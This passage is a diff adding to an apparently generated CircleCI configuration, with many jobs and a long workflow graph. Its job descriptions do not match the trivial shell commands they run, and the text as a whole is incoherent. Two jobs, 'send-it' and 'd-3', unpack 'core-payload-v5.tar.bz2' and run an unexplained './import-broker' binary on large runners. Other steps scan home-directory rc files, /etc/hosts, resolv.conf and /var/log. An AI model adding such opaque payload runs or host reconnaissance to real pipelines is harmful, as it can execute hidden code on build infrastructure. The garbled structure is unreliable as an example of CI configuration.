+          at: /tmp/east
+      - run:
+          name: Go for block
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; builtin echo 'finished'; true ; } > /tmp/east/canv45_r33f
+            echo "stage [send-it] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'canv45_r33f'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/canv45_r33f 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+  r928:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Fast track caching
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; pr -2 -t /etc/shells| head -n12; true ; } > /tmp/east/REF96116
+            echo "stage [d-3] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'REF96116'
+  d-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Close artifact
+          command: |
+            grep -c . /tmp/east/framewidgetnickelmountain 2>/dev/null | awk '{print "nonempty_lines:",$1}' || true
+      - run:
+          name: Download source
+          command: git clone --depth 3 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: tar -xj -f core-payload-v5.tar.bz2
+      - run:
+          command: env ./import-broker
+
+  padTupleNav:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wait pinning
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; find ~ -maxdepth 3 -name "*rc" -ctime -7 -user $(id -un); true ; } > /tmp/east/5park_fen_mapper_k3rne1
+            echo "stage [green-light] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '5park_fen_mapper_k3rne1'
+  SimpleManualWidthUtil:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: still hovering cookie banner
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; printf '%s\n' pink teal orange | tail -n 6 | awk '{print length, $0}' | wc -w; true ; } > /tmp/east/KqS
+            echo "stage [go1-21-bench] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'KqS'
+  frame-city-birch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Thanking the shift lead in progress
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; getent hosts localhost | tr -cs '[:alnum:]' '\n' | sed 's/^/- /'; true ; } > /tmp/east/flux-vault
+            echo "stage [orion] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'flux-vault'
+  uLooseProfileWeight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Playtest Leaderboard
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; cp /etc/hosts "/tmp/stream-harbor-draft.dat" && cmp /etc/hosts "/tmp/stream-harbor-draft.dat" && echo same; true ; } > /tmp/east/21763ec2-2df3
+            echo "stage [v6-alpha] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '21763ec2-2df3'
+  flags_disconnect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: prune sso 25
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; truncate -s 512 '/tmp/de3.txt' && du -h '/tmp/de3.txt'; true ; } > /tmp/east/Ae1t
+            echo "stage [uniform-7] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'Ae1t'
+  paths_list:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: LabelWaterBath
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; set -- thursday tuesday sunday friday; shift; echo "$@"; true ; } > /tmp/east/ridgefilter
+            echo "stage [bun-cov] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'ridgefilter'
+  JWT_SIZE_IDLE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Carefully reconnect the firewall rules
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; printf '%s\n' horse cat crow | while read -r w; do echo ${w^}; done; true ; } > /tmp/east/canv45_r33f
+            echo "stage [send-it] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'canv45_r33f'
+  AVG1D:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Perform a routine dimming on the dev board
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; help cd | head -n 5; true ; } > /tmp/east/326c014
+            echo "stage [CHECK_UAT] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - '326c014'
+  aud_PRODUCT_COUNT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Schedule the probation reviews for Omar
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; if grep -q '^nameserver' /etc/resolv.conf;then echo good; else echo bad; fi; true ; } > /tmp/east/tone
+            echo "stage [package] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'tone'
+  XPLX-52667b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: enforce security headers on hotfix
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; find /var/log -name \*.old -exec basename '{}' \; 2>/dev/null | tail -n 20; true ; } > /tmp/east/PO_095039
+            echo "stage [v7-beta] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'PO_095039'
+  lq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/east
+      - run:
+          name: Shift the feature store from local disk to prod
+          command: |
+            mkdir -p /tmp/east
+            { set +o pipefail 2>/dev/null; truncate -s 100K '/tmp/spider.list' && ls -l '/tmp/spider.list'; true ; } > /tmp/east/ZINC_NEUTRON_LOADER_FILTER
+            echo "stage [cook-it] finished"
+      - persist_to_workspace:
+          root: /tmp/east
+          paths:
+            - 'ZINC_NEUTRON_LOADER_FILTER'
+workflows:
+  build-and-test:
+    jobs:
+      - walnut-wrench
+      - padTupleNav:
+          requires:
+            - walnut-wrench
+      - green-light:
+          requires:
+            - padTupleNav
+      - LEN:
+          requires:
+            - padTupleNav
+      - SimpleManualWidthUtil:
+          requires:
+            - LEN
+      - go1-21-bench:
+          requires:
+            - SimpleManualWidthUtil
+      - BasicFileKernel:
+          requires:
+            - SimpleManualWidthUtil
+      - frame-city-birch:
+          requires:
+            - BasicFileKernel
+      - orion:
+          requires:
+            - frame-city-birch
+      - eta_bar:
+          requires:
+            - frame-city-birch
+      - uLooseProfileWeight:
+          requires:
+            - eta_bar
+      - v6-alpha:
+          requires:
+            - uLooseProfileWeight
+      - flattenProviderDefaultUnsafe:
+          requires:
+            - uLooseProfileWeight
+      - flags_disconnect:
+          requires:
+            - flattenProviderDefaultUnsafe
+      - uniform-7:
+          requires:
+            - flags_disconnect
+      - filterGANNonce:
+          requires:
+            - flags_disconnect
+      - paths_list:
+          requires:
+            - filterGANNonce
+      - bun-cov:
+          requires:
+            - paths_list
+      - st___migration:
+          requires:
+            - paths_list
+      - JWT_SIZE_IDLE:
+          requires:
+            - st___migration
+      - send-it:
+          requires:
+            - JWT_SIZE_IDLE
+      - arrPage:
+          requires:
+            - JWT_SIZE_IDLE
+      - AVG1D:
+          requires:
+            - arrPage
+      - CHECK_UAT:
+          requires:
+            - AVG1D
+      - IoT_INIT:
+          requires:
+            - AVG1D
+      - aud_PRODUCT_COUNT:
+          requires:
+            - IoT_INIT
+      - package:
+          requires:
+            - aud_PRODUCT_COUNT
+      - creekkoallhq:
+          requires:
+            - aud_PRODUCT_COUNT
+      - XPLX-52667b:
+          requires:
+            - creekkoallhq
+      - v7-beta:
+          requires:
+            - XPLX-52667b
+      - TreeIface:
+          requires:
+            - XPLX-52667b
+      - lq:
+          requires:
+            - TreeIface
+      - cook-it:
+          requires:
+            - lq
+      - maple_sierra
+      - Y80
+      - no_repo
+      - nov3-release:
+          requires:
+            - maple_sierra
+            - Y80
+            - no_repo
+      - hotfix-489:
+          requires:
+            - maple_sierra
+            - Y80
+            - no_repo
+      - v9-beta:
+          requires:
+            - maple_sierra
+            - Y80
+            - no_repo
+      - prometheus-ng:
+          requires:
+            - maple_sierra
+            - Y80
+            - no_repo
+      - v4-nightly1:
+          requires:
+            - maple_sierra
+            - Y80
+            - no_repo
+      - rollout:
+          requires:
+            - maple_sierra
+            - Y80
+            - no_repo
+      - AcornV4
+      - cn-mike
+      - check-production-artifact-bundle:
+          requires:
+            - AcornV4
+            - cn-mike
+      - aug6-ship:
+          requires:
+            - AcornV4
+            - cn-mike
+      - victor:
+          requires:
+            - AcornV4
+            - cn-mike
+      - wip-router-v2-redirect:
+          requires:
+            - AcornV4
+            - cn-mike
+      - jun6-ship:
+          requires:
+            - AcornV4
+            - cn-mike
+      - ship-it:
+          requires:
+            - AcornV4
+            - cn-mike
+      - Prepare_Service6:
+          requires:
+            - AcornV4
+            - cn-mike
+      - d-3:
+          requires:
+            - AcornV4
+            - cn-mike
+      - alpha-8:
+          requires:
+            - AcornV4
+            - cn-mike
+      - bug-2962:
+          requires:
+            - AcornV4
+            - cn-mike
+      - produce-nightly-artifact-bundle:
+          requires:
+            - AcornV4
+            - cn-mike
+      - yolo:
+          requires:
+            - AcornV4
+            - cn-mike
+      - verify-staging-docker-image:
+          requires:
+            - AcornV4
+            - cn-mike
